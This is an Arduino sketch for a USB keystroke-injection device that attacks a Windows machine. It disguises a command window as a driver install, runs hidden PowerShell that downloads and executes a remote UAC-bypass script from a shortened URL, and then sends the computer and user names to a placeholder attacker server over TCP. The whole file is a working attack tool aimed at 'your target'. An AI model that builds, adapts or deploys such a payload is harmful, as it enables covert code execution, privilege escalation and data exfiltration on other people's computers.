#include <HID-Project.h>
void setup() {
  Keyboard.begin();
  hurryUp();
  killCaps();
  bypassUAC();
  bubblePopup();
  //THIS DELAY IS IMPORTANT, AND MAY NEED TO BE MODIFIED FOR YOUR TARGET
  delay(1000);
  userAndComputer();
  Keyboard.end();
}
void pressEnter(){
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.release(KEY_RETURN);
}
void hurryUp(){
  boolean areWeThereYet = capsCheck();
  while (areWeThereYet == capsCheck()){
    hitCaps();
  }
  hitCaps();
}

boolean capsCheck(){
  if (BootKeyboard.getLeds() & LED_CAPS_LOCK){
    return true;
  }
  else{
    return false;
  }
}

void hitCaps(){
  Keyboard.press(KEY_CAPS_LOCK);
  delay(100);
  Keyboard.release(KEY_CAPS_LOCK);
}

void killCaps(){
  if (capsCheck())
  {
      hitCaps();
  }
}

void bypassUAC(){
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press('r');
   delay(200);
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
   Keyboard.println("cmd.exe /T:01 /K mode CON: COLS=15 LINES=1 && title Installing Drivers");
   delay(1000);
   pressEnter();
   Keyboard.println("powershell -NoP -NonI -W Hidden -Exec Bypass \"IEX (New-Object System.Net.WebClient).DownloadString('https://goo.gl/fPl4tm');Bypass-UAC -Method ucmDismMethod;\"");
   pressEnter();
   delay(1750);
}
void bubblePopup(){
}
void userAndComputer(){
  Keyboard.print("$pc = $env:computername;$user = $env:UserName; $Message = $pc + '     ' + $user; $port=[PORT FOR SERVER]; $remoteHost='[IP ADDRESS FOR SERVER]'; $socket = new-object System.Net.Sockets.TcpClient($remoteHost, $port); $data = [System.Text.Encoding]::ASCII.GetBytes($Message); $stream = $socket.GetStream(); $stream.Write($data,0,$data.Length);exit;");
  pressEnter();
}
void loop()
{
}
